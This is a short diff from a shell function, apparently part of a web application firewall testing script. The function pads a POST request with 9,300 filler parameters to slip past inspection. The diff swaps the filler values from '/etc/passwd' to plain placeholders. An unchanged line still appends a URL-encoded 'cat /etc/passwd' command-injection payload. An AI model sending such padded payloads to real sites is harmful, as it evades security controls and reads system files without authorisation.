@@ -266,8 +266,7 @@ preformWAFBypassExcessivePostParams(){
       # Loop to add additional parameters
       for i in {1..9300}
       do
-        # params="$params&param$i=value$i"
-        params="$params&param$i=/etc/passwd"
+        params="$params&param$i=value$i"
       done
 
       params="$params&arg=cat%20/etc/passwd"
